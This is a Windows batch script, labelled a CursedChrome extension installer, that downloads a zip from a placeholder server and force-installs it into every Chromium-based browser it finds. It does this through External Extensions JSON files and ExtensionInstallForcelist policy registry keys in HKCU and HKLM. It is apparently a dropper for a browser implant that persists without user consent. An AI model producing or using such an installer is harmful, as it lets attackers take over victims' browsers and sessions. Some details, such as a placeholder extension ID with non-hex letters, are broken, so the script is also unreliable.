@echo off
setlocal EnableDelayedExpansion

:: ============================================
:: CursedChrome Extension Installer for Windows
:: Installs extension to all Chromium-based browsers
:: ============================================

:: Configuration - MODIFY THIS URL
set "EXTENSION_URL=https://your-server.com/extension.zip"
set "EXTENSION_ID=cursedchrome"

:: Temp directory for download
set "TEMP_DIR=%TEMP%\cc_ext_%RANDOM%"
set "EXT_DIR=%TEMP_DIR%\extension"

:: Create temp directory
mkdir "%TEMP_DIR%" 2>nul
mkdir "%EXT_DIR%" 2>nul

echo [*] CursedChrome Extension Installer
echo [*] Downloading extension...

:: Download extension using PowerShell (works on all modern Windows)
powershell -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%EXTENSION_URL%' -OutFile '%TEMP_DIR%\extension.zip' -UseBasicParsing } catch { exit 1 }"

if %ERRORLEVEL% neq 0 (
    echo [!] Download failed.
    goto :cleanup
)

echo [*] Extracting extension...

:: Extract using PowerShell
powershell -Command "Expand-Archive -Path '%TEMP_DIR%\extension.zip' -DestinationPath '%EXT_DIR%' -Force"

if %ERRORLEVEL% neq 0 (
    echo [!] Extraction failed.
    goto :cleanup
)

:: Find the actual extension folder (might be nested)
for /d %%D in ("%EXT_DIR%\*") do (
    if exist "%%D\manifest.json" (
        set "EXT_DIR=%%D"
    )
)

:: Get extension ID from manifest if possible, else use default
set "ACTUAL_EXT_ID=%EXTENSION_ID%"

:: Install location for extensions
set "INSTALL_BASE=%LOCALAPPDATA%\CursedChromeExtensions"
mkdir "%INSTALL_BASE%" 2>nul
set "FINAL_EXT_PATH=%INSTALL_BASE%\%ACTUAL_EXT_ID%"

:: Copy extension to permanent location
xcopy /E /I /Y "%EXT_DIR%" "%FINAL_EXT_PATH%" >nul

echo [*] Extension installed to: %FINAL_EXT_PATH%

:: ============================================
:: Browser Detection and Registry Installation
:: ============================================

echo [*] Installing to browsers...

:: Chrome
call :install_browser "Google\Chrome" "Software\Google\Chrome\Extensions" "Chrome"

:: Edge
call :install_browser "Microsoft\Edge" "Software\Microsoft\Edge\Extensions" "Edge"

:: Brave
call :install_browser "BraveSoftware\Brave-Browser" "Software\BraveSoftware\Brave-Browser\Extensions" "Brave"

:: Vivaldi
call :install_browser "Vivaldi" "Software\Vivaldi\Extensions" "Vivaldi"

:: Opera GX
call :install_browser "Opera Software\Opera GX Stable" "Software\Opera Software\Opera GX Stable\Extensions" "Opera GX"

:: Opera
call :install_browser "Opera Software\Opera Stable" "Software\Opera Software\Opera Stable\Extensions" "Opera"

echo.
echo [+] Installation complete!
echo [*] Restart browsers to load the extension.
echo.

goto :cleanup

:: ============================================
:: Function: Install to a specific browser
:: ============================================
:install_browser
set "BROWSER_PATH=%~1"
set "REG_PATH=%~2"
set "BROWSER_NAME=%~3"

:: Check if browser exists
set "BROWSER_EXE_PATH=%LOCALAPPDATA%\%BROWSER_PATH%\Application"
if not exist "%BROWSER_EXE_PATH%" (
    set "BROWSER_EXE_PATH=%ProgramFiles%\%BROWSER_PATH%\Application"
)
if not exist "%BROWSER_EXE_PATH%" (
    set "BROWSER_EXE_PATH=%ProgramFiles(x86)%\%BROWSER_PATH%\Application"
)

:: Try to detect if browser is installed via registry
reg query "HKCU\%REG_PATH%" >nul 2>&1
if %ERRORLEVEL% neq 0 (
    reg query "HKLM\%REG_PATH%" >nul 2>&1
    if %ERRORLEVEL% neq 0 (
        :: Browser might still be installed, try anyway
    )
)

:: Method 1: External Extension JSON (Most reliable for Developer Mode)
call :create_external_json "%BROWSER_NAME%"

:: Method 2: Registry-based installation (For enterprise deployment)
call :create_registry_entry "%REG_PATH%" "%BROWSER_NAME%"

echo [+] %BROWSER_NAME%: Configured

goto :eof

:: ============================================
:: Function: Create External Extension JSON
:: ============================================
:create_external_json
set "BROWSER_NAME=%~1"

:: Determine the external extensions directory based on browser
if /i "%BROWSER_NAME%"=="Chrome" (
    set "EXT_JSON_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default\External Extensions"
) else if /i "%BROWSER_NAME%"=="Edge" (
    set "EXT_JSON_DIR=%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\External Extensions"
) else if /i "%BROWSER_NAME%"=="Brave" (
    set "EXT_JSON_DIR=%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\External Extensions"
) else if /i "%BROWSER_NAME%"=="Vivaldi" (
    set "EXT_JSON_DIR=%LOCALAPPDATA%\Vivaldi\User Data\Default\External Extensions"
) else if /i "%BROWSER_NAME%"=="Opera GX" (
    set "EXT_JSON_DIR=%APPDATA%\Opera Software\Opera GX Stable\External Extensions"
) else if /i "%BROWSER_NAME%"=="Opera" (
    set "EXT_JSON_DIR=%APPDATA%\Opera Software\Opera Stable\External Extensions"
) else (
    goto :eof
)

:: Create directory if not exists
if not exist "%EXT_JSON_DIR%" mkdir "%EXT_JSON_DIR%"

:: Generate a pseudo-extension ID (32 char hex based on path hash)
set "PSEUDO_ID=aaaabbbbccccddddeeeeffffgggghhhh"

:: Create the JSON file
set "JSON_FILE=%EXT_JSON_DIR%\%PSEUDO_ID%.json"
(
echo {
echo   "external_crx": "%FINAL_EXT_PATH:\=\\%",
echo   "external_version": "1.0.0"
echo }
) > "%JSON_FILE%" 2>nul

:: Alternative: Use path instead of crx
set "JSON_FILE2=%EXT_JSON_DIR%\%ACTUAL_EXT_ID%.json"
(
echo {
echo   "external_update_url": "file:///%FINAL_EXT_PATH:\=/%/updates.xml"
echo }
) > "%JSON_FILE2%" 2>nul

goto :eof

:: ============================================
:: Function: Create Registry Entry (GPO-style)
:: ============================================
:create_registry_entry
set "REG_BASE=%~1"
set "BROWSER_NAME=%~2"

:: Try to add to ExtensionInstallForcelist (Enterprise Policy)
set "POLICY_PATH=Software\Policies\%REG_BASE%\ExtensionInstallForcelist"

:: Find the next available index
set "INDEX=1"
:find_index
reg query "HKCU\%POLICY_PATH%" /v "%INDEX%" >nul 2>&1
if %ERRORLEVEL% equ 0 (
    set /a INDEX+=1
    goto :find_index
)

:: Add the extension to forcelist (path-based installation for dev mode)
:: Format: extension_id;update_url
reg add "HKCU\%POLICY_PATH%" /v "%INDEX%" /t REG_SZ /d "%ACTUAL_EXT_ID%;file:///%FINAL_EXT_PATH:\=/%/updates.xml" /f >nul 2>&1

:: Also try HKLM for system-wide installation (requires admin)
reg add "HKLM\%POLICY_PATH%" /v "%INDEX%" /t REG_SZ /d "%ACTUAL_EXT_ID%;file:///%FINAL_EXT_PATH:\=/%/updates.xml" /f >nul 2>&1

goto :eof

:: ============================================
:: Cleanup
:: ============================================
:cleanup
:: Remove temp files
rd /s /q "%TEMP_DIR%" 2>nul

endlocal
exit /b 0
